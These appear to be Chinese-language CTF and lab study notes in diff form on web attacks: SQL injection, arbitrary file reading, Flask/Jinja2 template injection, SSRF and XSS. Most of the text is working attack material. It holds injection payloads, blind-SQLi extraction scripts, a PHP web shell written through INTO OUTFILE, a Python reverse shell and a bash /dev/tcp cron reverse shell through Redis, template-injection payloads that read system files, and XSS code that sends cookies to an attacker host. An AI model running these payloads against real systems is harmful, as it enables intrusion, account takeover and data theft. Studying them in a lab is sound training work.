@@ -1,0 +1,1137 @@
+SQL注入	（函数：database()	version()	=1' or 1=1#）
+
+
+	=1' union select 1,2,group_concat(concat_ws(":",id,username,password)) from 【table】%23			(!输出table中的所有信息!)
+
+
+	1 数字型( select - from - where id=【】 )
+		=1
+		=1'
+		=3-1
+		=1 order by n
+		=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
+		=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='【table】'
+		=-1 union select 【column】,【column】,3 from 【table】 where 【column】='admin'
+
+	2 字符型( select - from - where id='【】' )	( # = %23 )
+		=1
+		=1'
+		=1' #
+		=1' order by n#
+		=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+		=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='【table】'#
+		=-1' union select 【column】,【column】,3 from 【table】 where 【column】='admin'#
+
+	3 布尔盲注( select - from - where id='【】' )	（ true or false ）
+		=1
+		=1'
+		=1' and 1<2--+
+		=1' and 1>2--+
+		=1' or 1=1#
+
+
+		exploit1.py	(当前库中的所有表名)
+
+
+import requests
+	#目标 url
+url = 'http://192.168.184.200/inject/my.php?id=1'
+	#设置一个空字符串，用于存放查询出来数据
+result = ''
+	#i 表示表的长度，一般不会超过 30
+for i in range(1,30):
+	#j 表示 ascii 码（字母、数字还有一些特殊符号）
+	for j in range(32,127):
+		#注入语句
+		payload = "' and (select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1))) = {}%23".format(i,j)
+			#将网址和注入语句拼接成访问请求
+		r = requests.get(url+payload)
+			#print(r.text)
+		if('有数据' in r.text):
+			#将匹配到的字符添加到 result 中
+			result += chr(j)
+				#打印匹配到的字符
+			print(result)
+				#跳出此次循环
+			break
+
+
+		exploit2.py	(当前表中的所有字段)
+
+
+import requests
+	#目标 url
+url = 'http://192.168.184.200/inject/my.php?id=1'
+	#设置一个空字符串，用于存放查询出来数据
+result = ''
+	#i 表示表的长度，一般不会超过 30
+for i in range(1,30):
+	#j 表示 ascii 码（字母、数字还有一些特殊符号）
+	for j in range(32,127):
+		#注入语句
+		payload = "' and (select ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='【	】'), {}, 1))) = {}%23".format(i,j)
+			#将网址和注入语句拼接成访问请求
+		r = requests.get(url+payload)
+			#print(r.text)
+		if('有数据' in r.text):
+			#将匹配到的字符添加到 result 中
+			result += chr(j)
+				#打印匹配到的字符
+			print(result)
+				#跳出此次循环
+			break
+
+
+		exploit3.py	(当前表中的内容)
+
+
+import requests
+	#目标 url
+url = 'http://192.168.184.200/inject/my.php?id=1'
+	#设置一个空字符串，用于存放查询出来数据
+result = ''
+	#i 表示表的长度，一般不会超过 50
+for i in range(1,50):
+	#j 表示 ascii 码（字母、数字还有一些特殊符号）
+	for j in range(32,127):
+		#注入语句
+		payload = "' and (select ascii(mid((select concat(【	】, 0x7e, 【	】) from wp_user), {}, 1))) = {}%23".format(i,j)
+			#将网址和注入语句拼接成访问请求
+		r = requests.get(url+payload)
+			#print(r.text)网安实验班内部资料
+		if('有数据' in r.text):
+			#将匹配到的字符添加到 result 中
+			result += chr(j)
+				#打印匹配到的字符
+			print(result)
+				#跳出此次循环
+			break
+
+
+
+	4 时间盲注( select - from - where id='【】' )	（#与--都为注释）
+		=1
+		=-1
+		=1' and if(length(database())>1,1,sleep(5))--+
+		=1' and if(length(database())<1,1,sleep(5))--+
+
+
+	exploit1.py	(当前库中的所有表名)
+
+
+import requests
+import time
+	#目标 url
+url = 'http://192.168.184.200/inject/my.php?id=1'
+	#设置一个空字符串，用于存放查询出来数据
+result = ''
+	#i 表示表的长度，一般不会超过 30
+for i in range(1,30):
+	#j 表示 ascii 码（字母、数字还有一些特殊符号）
+	for j in range(32,127):
+		#注入语句
+		payload = "' and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={},sleep(3),1)--+".format(i,j)
+			#开始时间
+		stime = time.time()
+			#将网址和注入语句拼接成访问请求
+		r = requests.get(url+payload)
+			#结束时间
+		etime = time.time()
+			#判断时间差
+		if etime-stime >= 3:
+			#将匹配到的字符添加到 result 中
+			result += chr(j)
+				#打印匹配到的字符
+			print(result)
+				#跳出此次循环
+			break
+
+
+	exploit2.py	(当前表中的所有字段)
+
+
+import requests
+import time
+	#目标 url
+url = 'http://192.168.184.200/inject/my.php?id=1'
+	#设置一个空字符串，用于存放查询出来数据
+result = ''
+	#i 表示表的长度，一般不会超过 30
+for i in range(1,30):
+	#j 表示 ascii 码（字母、数字还有一些特殊符号）
+	for j in range(32,127):
+		#注入语句
+		payload = "' and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='【	】'),{},1))={},sleep(3),1)--+".format(i,j)
+			#开始时间
+		stime = time.time()
+			#将网址和注入语句拼接成访问请求
+		r = requests.get(url+payload)
+			#print(r.text);
+			#结束时间
+		etime = time.time()
+			#判断时间差
+		if etime-stime >= 3:
+			#将匹配到的字符添加到 result 中
+			result += chr(j)
+				#打印匹配到的字符
+			print(result)
+				#跳出此次循环
+			break
+
+
+	exploit3.py	(当前表中的内容)
+
+
+import requests
+import time
+	#目标 url
+url = 'http://192.168.184.200/inject/my.php?id=1'
+	#设置一个空字符串，用于存放查询出来数据
+result = ''
+	#i 表示表的长度，一般不会超过 50
+for i in range(1,50):
+	#j 表示 ascii 码（字母、数字还有一些特殊符号）
+	for j in range(32,127):
+		#注入语句
+		payload = "' and if(ascii(mid((select concat(【	】, 0x7e, 【	】) from wp_user),{},1))={},sleep(3),1)--+".format(i,j)
+			#开始时间
+		stime = time.time()
+			#将网址和注入语句拼接成访问请求网安实验班内部资料
+		r = requests.get(url+payload)
+			#print(r.text);
+			#结束时间
+		etime = time.time()
+			#判断时间差
+		if etime-stime >= 3:
+		#将匹配到的字符添加到 result 中去
+			result += chr(j)
+				#打印匹配到的字符
+			print(result)
+				#跳出此次循环
+			break
+
+
+	5 报错注入	（ select username from user where id=1 and updatexml(1,concat('0x7e',(select database()),'0x7e'),3); ）	（~=0x7e）
+			（=admin'^extractvalue(1,concat(0x7e,(select(database()))))%23）			(!	or=^	and=&	!)
+		=1' OR UPDATEXML(1,CONCAT(0x7e,(select database()),0x7e),1)#
+		=1' OR UPDATEXML(1,CONCAT(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+		=1' OR UPDATEXML(1,CONCAT(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=【	】),0x7e),1)#
+		=1' OR UPDATEXML(1,CONCAT(0x7e,(select group_concat(【	】) from 【	】),0x7e),1)#
+
+		=admin'^extractvalue(1,concat(0x7e,(select(database()))))#											(可避免空格waf过滤)
+		=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('【table】')))))#
+		=admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('【column】')))))#
+		=admin'^extractvalue(1,concat(0x7e,(select(【column】)from(【database】.【table】))))#								(括号代替空格)
+		=admin%27^extractvalue(1,concat(0x7e,(select(left(【column】,30))from(【database】.【table】))))#							(字段显示不完全时用)
+		=admin%27^extractvalue(1,concat(0x7e,(select(right(【column】,30))from(【database】.【table】))))#						(字段显示不完全时用)
+
+
+	6 多语句注入（ select - from - where id='【】' ）
+		=-1';select 1,2#
+		=-1';select * from 【	】
+		=-1';select “\u003C?php phpinfo(); ?>” into outfile “D:\\PHPKFGJ\\phpstudy\\PHPTutorial\\WWW\\213.php”--+
+
+	7 二次注入（注册登录界面使用，注册时未过滤）		('=%27)
+		注册
+			username=test'&password=123456
+			返回id=5
+		登录
+			id=5
+			报错
+		注册
+			username=test' order by n#&password=123456
+			username=test' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=123456
+			username=test' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=【	】#&password=123456
+			username=test' union select 【column】,【column】,3 from 【table】 where 【column】='admin'#&password=123456
+
+	8 宽字节注入（addslashes函数对特殊符号转义，在前面加\）
+		=1'	->	1\'
+		=1%df'	->	1%df\'		(\=%5c	%df%5c在GBK编码中为连的繁体字)
+		=1%df' order by n#
+		=1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+		=1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=【	】#
+		=1%df' union select 【column】,【column】,3 from 【table】 where 【column】='admin'#
+
+	9 cookie注入（在头部的cookie部位）
+		=1
+		=1'
+		=1'#
+		=1%df' order by n#
+		=1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+		=1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=【	】#
+		=1%df' union select 【column】,【column】,3 from 【table】 where 【column】='admin'#
+
+	10 XFF注入（Client-Ip	X-Forwarded-For		Remote_Address(无法伪造)）
+		Client-Ip: 1' order by n#
+		Client-Ip: 1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+		Client-Ip: 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=【	】#
+		Client-Ip: 1' union select 【column】,【column】,3 from 【table】 where 【column】='admin'#
+
+		X-Forwarded-For: 1' order by n#
+		X-Forwarded-For: 1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+		X-Forwarded-For: 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=【	】#
+		X-Forwarded-For: 1' union select 【column】,【column】,3 from 【table】 where 【column】='admin'#
+
+	easy_sql( select 【】 from - )
+
+	[报错信息分析]
+		1.use near ''1'') LIMIT 0,1' at line 1
+			'' 1' ') LIMIT 0,1'
+				注入	1')%23
+
+		2.to use near ''1'' LIMIT 0,1' at line 1
+			'' 1' ' LIMIT 0,1'
+				注入	1'%23
+
+		3.
+
+
+	利用SQL注入写入文件
+		http://192.168.184.200:20021/getsvg.php?id=-1' union select 1,'<?php system($_GET[cmd]);?>' into outfile '/var/www/html/svg/shell.php'%23
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+AFR漏洞（任意文件读取）		链接：https://blog.csdn.net/qq_40909772/article/details/121381691
+
+
+
+	1.例子
+
+
+1.1
+	?p=hello											(直接获取)
+	?p=../../../flag
+
+1.2
+	?p=file:///etc/passwd										(file://伪协议)
+	?p=file:///flag
+
+1.3
+	?p=php://filter/resource=flag									(php://filter协议流)
+	?p=php://filter/read=string.toupper|string.rot13/resource=http://www.example.com
+	?p=php://filter/write=string.rot13/resource=example.txt
+	?p=php://filter/read=convert.base64-encode/resource=flag
+		四个参数：resource=<要过滤的数据流>
+			 read=<读链的筛选列表>		可以设定一个或多个过滤器名称，以管道符|分隔
+			 write=<写链的筛选列表>		可以设定一个或多个过滤器名称，以管道符|分隔
+			 <;两个链的筛选列表>
+		过滤器：	string.rot13				(字符串过滤器)
+			string.toupper
+			string.tolower
+			string.strip_tags
+
+			convert.base64-encode			(转换过滤器)
+			convert.base64-encode
+			convert.quoted-printable-encode
+			convert.quoted-printable-decode
+
+			zlib.deflate				(压缩过滤器)
+			zlib.inflate
+			bzip2.compress				
+			bzip2.decompress
+
+			mcrypt.tripledes			(加密过滤器)
+			mdecrypt.tripledes
+
+1.4
+	http://192.168.184.200:20003/img../								(nginx配置错误实现穿越)
+
+
+
+	2.开发语言触发点
+
+
+
+2.1 PHP
+标准库函数：file_get_contents()、file()、fopen()函数（及其文件指针操作函数fread()、fgets()等），与文件包含相关的函数（include()、require()、include_once()、require_once()等），以及通过PHP读文件的执行系统命令（system()、exec()等）。
+拓展：php-curl扩展（文件内容作为HTTP body）涉及文件存取的库（如数据库相关扩展、图片相关扩展）、XML模块造成的XXE。
+
+2.2 Python
+漏洞经常出现在框架请求静态资源文件部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是框架开发者忽略了Python函数的feature。
+涉及文件操作的应用也因为滥用open函数、模板的不当渲染导致任意文件读取。如：将用户输入的某些数据作为文件名的一部分（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过将经过处理的用户输入数据作为索引去查找相关文件。
+攻击者构造软链接放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。
+Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件读取。
+
+2.3 Java
+Java本身的文件读取函数FileInputStream、XXE导致的文件读取。Java的一些模块也支持“file://”协议，这是Java应用中出现任意文件读取最多的地方，如Spring Cloud Config Server路径穿越与任意文件读取漏洞（CVE-2019-3799）、Jenkins任意文件读取漏洞（CVE-2018-1999002）等。
+
+2.4 Ruby
+Ruby的任意文件读取漏洞通常与Rails框架相关。到目前为止，我们已知的通用漏洞为Ruby On Rails远程代码执行漏洞（CVE-2016-0752）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2018-3760）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2019-5418）。笔者在CTF竞赛中就曾遇到Ruby On Rails远程代码执行漏洞（CVE-2016-0752）的利用。
+
+2.5 Node
+Node.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849)。
+CTF中Node的文件读取漏洞通常为模板注入、代码注入等情况。
+
+
+
+	3.中间件/服务器相关触发点
+
+
+
+3.1 Nginx错误配置
+Location /static{
+Alias /home/myapp/static/;
+}
+如果配置文件中包含上面这段内容，很可能是运维或者开发人员想让用户可以访问static目录（一般是静态资源目录）。
+如果用户请求的Web路径是/static…/，拼接到alias上就变成了/home/myapp/static/…/，此时便会产生目录穿越漏洞，并且穿越到了myapp目录。
+
+3.2 数据库
+以mysql为例：
+
+MySQL的load_file()函数可以进行文件读取，但是load_file()函数读取文件首先需要数据库配置FILE权限（数据库root用户一般都有）。
+其次需要执行load_file()函数的MySQL用户/用户组对于目标文件具有可读权限（很多配置文件都是所有组/用户可读），主流Linux系统还需要Apparmor配置目录白名单（默认白名单限制在MySQL相关的目录下）。
+
+3.3 软链接
+bash命令ln-s可以创建一个指向指定文件的软链接文件，然后将这个软链接文件上传至服务器，当我们再次请求访问这个链接文件时，实际上是请求在服务端它指向的文件。
+
+3.4 FFmpeg
+参考一道题目：https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html
+
+3.5 Docker-API
+Docker-API可以控制Docker的行为，一般来说，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。
+当我们遇见SSRF漏洞时，尤其是可以通过SSRF漏洞进行UNIX Socket通信的时候，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作），从而形成一种另类的任意文件读取。
+
+
+
+	4.文件读取的目标目录
+
+
+
+/etc：/etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。
+
+/etc/passwd：/etc/passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户/组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。
+
+/etc/shadow：/etc/shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。
+
+/etc/apache2/*：是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。
+
+/etc/nginx/*：是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。
+
+/etc/apparmor(.d)/*：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。
+
+/etc/(cron.d/*|crontab)：定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。
+
+/etc/environment：是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。
+
+/etc/hostname：表示主机名。
+
+/etc/hosts：是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP/域名。
+
+/etc/issue：指明系统版本。
+
+/etc/mysql/*：是MySQL配置文件。
+
+/etc/php/*：是PHP配置文件。
+
+/proc目录：/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。
+
+	目录下的cmdline可读出比较敏感的信息：/proc/[pid]/cmdline
+
+	通过cwd命令可以直接跳转到当前目录:/proc/[pid]/cwd
+
+	环境变量中可能存在secret_key，这时也可以通过environ进行读取：/proc/[pid]/environ
+
+其他目录：
+	Nginx配置文件可能存在其他路径：/usr/local/nginx/conf/*
+
+	日志文件：/var/log/*
+
+	Apache默认Web根目录：/var/www/html
+
+	PHP session目录：/var/lib/php(5)/sessions 可能泄露用户Session
+
+	用户目录：[user_dir_you_know]/.bash_history 历史命令执行
+
+	[user_dir_you_know]/.bashrc 部分环变量
+
+	[user_dir_you_know]/.ssh/id_rsa(.pub) ssh登录的私钥/公钥
+
+	[user_dir_you_know]/.viminfo vim的使用记录
+
+
+
+！！！知识点1：在PHP中
+	$_=[];
+	$_=$_.'';
+	echo $_;
+			输出Array
+			$_[0] =A		$_[3] =a		$_[3]++ =b	$_[('!'=='!')+('!'=='!')+('!'=='!')] =a
+	
+	强行拼接数组和字符串时，会把数组转换为字符串，值为Array，可以通过这个性质来构造playload绕过限制
+
+	例：
+	<?$_=[];$_=$_.'';$__=$_[('!'=='!')+('!'=='!')+('!'=='!')];$_=$__;$_++;$_++;$_++;$_++;$_++;$___=$_;$_=$__;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;$_=$__;$___.=$_;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;?>
+
+	输出$___为flag
+
+
+
+!!!知识点2：Flask中，服务器发放的cookie都会通过密钥（secret_key）加密，加密后格式为（eyJiYWxhbmNlIjoxMzM3LCJwdXJjaGFzZXMiOltdfQ.ZEIAHA.2fe9ikGgyJtsgAGpCUnaqKw-cfE）
+
+	可以用	flask_session_cookie_manager3.py	加密/解密
+		python3 flask_session_cookie_manager3.py encode -s '' -t ''
+		python3 flask_session_cookie_manager3.py decode -s '' -c ''
+
+
+
+!!!知识点3：Flask中的Debug模式，给开发人员提供报错信息，方便测试网站（Debug启动时会生成PIN码，在网站进入Debug控制台时需要输入）
+	PIN码是根据下面六个参数生成的（python版本3.7）
+			（程序getpin1.py，将靶机参书填入程序后运行即可获得靶机的PIN码）
+
+			username：通过 getpass.getuser()读取，结果就是启动 web 应用程序的用户；
+			modname：通过 getattr(app, "__module__", t.cast(object, app).__class__.__module__)读取，默认就是 flask.app；
+			appname：通过 getattr(app, "__name__", type(app).__name__)读取，默认 Flask；
+			moddir：通过 getattr(mod, "__file__", None)读取，结果就是 app.py 所在全路径，即/usr/local/lib/python3.7/site-packages/flask/app.py；
+			uuid：通过 uuid.getnode()获取；
+			machine_id：get_machine_id()；
+
+	 靶机Python 版本>3.8，那么生成 PIN 码的方法会有所不同，获取uuid和machine_id的方法也不同
+			（getpin2.py）
+
+
+
+！！！知识点4：python魔术方法
+
+	""							# 获得一个字符串实例
+	"".__class__						# 获得字符串的 type 实例
+	"".__class__.__mro__					# 获得其父类
+	"".__class__.__mro__[2].__subclasses__()		# 获得 object 类的子类
+	
+输出：[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type '
+int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type '
+NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>,
+<type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <
+type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview
+'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>,
+<type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type '
+classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wr
+apper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <ty
+pe 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterato
+r'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldn
+ameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>,
+<type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zi
+pimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class
+'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._Itera
+tionGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmetho
+d'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <c
+lass '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>,
+<class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.S
+RE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.Incremental
+Encoder'>, <class 'codecs.IncrementalDecoder'>]
+
+	构造playload，可以绕过过滤
+		例："".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()		（[40]为<type 'file'>）	(使用file的read 属性读取)
+		   ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1.py','w').write('code')				(在/tmp/1.py文件写入code，可以是反弹shell)
+		    ().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('python /tmp/1.py').read()		(运行1.py)
+
+code例子：import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect
+(("192.168.184.150",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno
+(),2);p=subprocess.call(["/bin/bash","-i"]);
+
+{% for c in [].__class__.__base__.__subclasses__() %}{%if c.__name__=='catch_warnings' %}
+{{c.__init__.__globals__['__builtins__'].open('/this_is_the_f'+'lag.txt','r').read()}}{%
+endif %}{% endfor %}
+
+
+
+
+！！！知识点5：jinja2模板引擎	（在 Flask 中，对模板进行渲染通常使用 Jinja2 模板渲染引擎来完成）
+
+	{{ ... }}用来标记变量；
+	{% ... %}用来标记语句，比如 if 语句，for 语句等；
+	{# ... #}用来写注释。
+
+	例：
+		<h1>{{ username }}的个人主页</h1>
+		{% if bio %}
+		<p>{{ bio }}</p> {# 这里的缩进只是为了可读性，不是必须的 #}
+		{% else %}
+		<p>我是我们村最靓的仔。</p>
+		{% endif %} {# 大部分 Jinja 语句都需要声明关闭 #}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SSRF漏洞			（服务器端请求伪造）（通过漏洞服务器访问内网数据）	（代码审计）
+
+	关键：		curl_exec($url)
+			支持协议：
+				HTTP 和 HTTPS： cURL 最常用于执行 HTTP 和 HTTPS 请求，从 Web 服务器获取数据。
+
+				FTP： cURL 可以用于访问远程 FTP 服务器，进行文件上传和下载操作。
+
+				SCP 和 SFTP： cURL 支持通过 SCP 和 SFTP 协议进行安全的文件传输。
+
+				SMTP 和 POP3： cURL 可以用于与邮件服务器进行通信，发送和接收电子邮件。
+
+				LDAP： cURL 支持与 LDAP（轻型目录访问协议）服务器进行通信，用于访问和搜索目录服务。
+
+				Telnet 和 SSH： cURL 可以用于与 Telnet 和 SSH 服务器进行通信。
+
+				DICT： cURL 支持使用 DICT 协议访问在线字典服务。
+
+				IMAP 和 POP3： cURL 可以用于与邮件服务器进行通信，收取电子邮件。
+
+				RTSP 和 RTMP： cURL 支持实时流传输协议（RTSP）和实时媒体传输协议（RTMP），用于流媒体传输。
+
+				FILE： cURL 支持本地文件访问，可以使用类似 "file://path/to/file" 的 URL。
+
+
+			Example：
+				$url=file:///etc/passwd
+				$url=http://127.0.0.1/flag.php
+
+
+	url格式：	http://username:password@hostname/path?arg=value#anchor
+
+	gopher协议格式：	gopher://<host>:<port>/<selector>/tcp数据流
+
+
+
+！！！知识点1：FastCGI协议，nginx通过FastCGI与php-FPM通信，php-FPM是实现和管理 FastCGI 的进程
+
+在 php.ini 中有两个非常重要的配置项：
+auto_prepend_file：在执行目标 php 文件前，先包含该配置项指定的文件。这里可以使用伪协议 php:///input。
+auto_append_file：在执行目标 php 文件后，包含该配置项指向的文件。另外，通过伪协议 php:///input 可以读取客户端 HTTP 请求中 POST 的原始数据，如果将
+auto_prepend_file 设定为 php:///input，那么每个 php 文件在执行前都会包含 POST 的原始数据。但是启用伪协议 php:///input 的前提是需要将配置项 allow_url_include 设置为 true。
+
+因为 Nginx 通过 FastCGI 协议可以传输配置信息、需要访问的 PHP 文件名和客户端提交上来的 GET、POST、Cookie 等数据，所以攻击者可以通过伪造 FastCGI 协议数据包来修改这
+些配置项：将 allow_url_include 设置为 true，将 auto_prepend_file 设置为 php:///input，然后在 HTTP 请求中 POST 的原始数据部分写上调用 shell 命令的 PHP 函数，这样就可以实现任意代码的执行。
+
+python3 fpm.py -c "<?php var_dump(shell_exec('id')); ?>" -p 29000 192.168.184.200/var/www/html/index.php | more			（使用fpm.py进行攻击开放端口）
+
+python2 gopherus.py --exploit fastcgi			（使用gopherus.py构造playload来攻击有SSRF漏洞的网站）
+
+
+
+！！！知识点2：redis(高性能，基于内存运行并支持持久化的Nosql数据库)
+
+1 Redis 是 key-value 的存储系统，也被称为数据结构服务器，因为它所存储的值可以是字符串 String，哈希 Hash，列表 List，集合 Sets，有序集合 Sorted Sets 等等。
+2 Redis 支持数据库持久化，可以把内存中的数据保存到本地磁盘，重启的时候，可以再次使用;数据的存储方式有多种;支持 Master-Slave 模式的数据备份。
+3 Redis 的读写速度极快，性能非常高，操作具有原子性，即本次操作要么执行，要么失败完全不执行，支持事务，也支持发布 (publish) /订阅 (subscribe) 工作模式
+4 Redis 提供控制台 redis-cli 命令操作，Redis 服务器的默认监听端口是 6379.正是因为 Redis 具有很多优点，所以在互联网行业中得到了广泛的应用。目前，几乎所有的大用户量、高并发的互联网应用系统，都会用到 Redis。
+
+Redis 持久化存储时，默认情况下，会对数据进行压缩，然后以二进制的方式存储在 rdb文件中。压缩采用 zf 算法。压缩时，会根据信息论的方法去除几余信息。在本例中，出现如下情况:
+1 当redis 中存储的字符串为“ n\n*/1* * * * bash -i>& /dev/tcp/192.168.184.100/12340>&1nn”时，持久化存储后，持久化文件中会出现正常的内容“*/1 *** * bash -i>&o7/dev/tcp/192.168.184.100/1234 0>&1” 
+2 但是，当 redis 中存储的字符串为“nn*/1**** bash i >&/dev/tcp/192.168.192.100/1234 0>&1nn”时，持久化存储后，持久化文件中会出现不正常的内容，例如“*/1*ash -i& /dev/tcp/192.168.00/1234 0>&1”;
+3 原因就是不同的字符串压缩的结果不同(可通过开源项目 python-lzf 进行测试)
+4 当修改 redis 的配置项 rdbcompression 为 no 时，redis 持久化时便不会对数据进行压缩，而是直接存储在磁盘文件中。
+
+socat		(端口转发，与nc类似)
+	socat TCP-LISTEN:80,fork TCP:192.168.184.150:80
+
+	socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672
+
+1. -d -d  前面两个连续的 -d -d 代表调试信息的输出级别。
+2. -lf /var/log/socat.log 指定输出信息的文件保存位置。 
+3. TCP4-LISTEN:15672 在本地建立一个 TCP IPv4 协议的监听端口，也就是转发端口。这里是 15672，请根据实际情况改成你自己需要转发的端口。
+4. bind 指定监听绑定的 IP 地址，不绑定的话将监听服务器上可用的全部 IP。
+5. reuseaddr 绑定一个本地端口。
+6. fork TCP4:172.17.0.15:15672 指的是要转发到的服务器 IP 和端口，这里是 172.17.0.15 的 15672 端口。
+
+
+
+！！！知识点3：序列化与反序列化（serialize,unserialize）		(可以在php中用serialize()方法)
+
+
+
+！！！知识点4：purl语言的CVE-2016-1238漏洞	（受影响的产品: Perl 5.22.1 Perl Perl 5.20.2 Perl Per5.20.1 Perl Perl 5.18.2 Perl Perl 5.16 Perl Perl 5.14 Perl Perl 5.12.1 Perl Perl 5.12）
+
+	当文件 id|存在于当前目录下时，运行命令 GET'file:id|' 时，就会执行 Linux 命 id;当文件|id 存在于当前目录下时，运行命令 GET'file:|id'时，也会执行 Linux 命令 id。
+
+
+
+！！！知识点5：哈希长度攻击
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+XSS跨站脚本攻击			（网站会执行我们提交的代码）	(可以创建钓鱼链接来获取目标的cookie来获取权限)
+
+
+
+
+	反射型		（在后端执行，非持久的）			（超链接：http://192.168.184.200:20014/search.php?q=<script src=http://192.168.184.150/hack.js>点击</script>）
+
+hack.js:
+	var img = new Image();
+	img.src = "http://192.168.184.150/wwb/hack.php?cc="+document.cookie;
+	document.body.append(img)
+
+hack.php
+	<?php
+		$cookie = $_GET['cc'];
+		$myFile = "cookie.txt";
+		file_put_contents($myFile,$cookie);
+	?>
+								(这种方法不需要实时监听)
+
+
+
+
+	存储型		（在后端执行，存储在网站中）		（<script>document.write("<img src='http://192.168.184.150/"+document.cookie+"'/>")</script>）
+								（在192.168.184.150的80端口监听，其他人加载这个网站时会把cookie发送过来）
+
+
+
+	DOM型		（在前端执行，DOM节点，url输入）		
+
+		http://192.168.184.200/dvwa/vulnerabilities/xss_d/?default=French<script>document.body.innerHTML+="<img src='http://192.168.184.150/"+document.cookie+"' />"</script>
+
+
+
+
+！！！知识点1：在HTML和JavaScript中，除了document关键字之外，还有一些其他关键字和对象可以用于操作和控制网页元素和行为。以下是一些常用的关键字和对象：
+
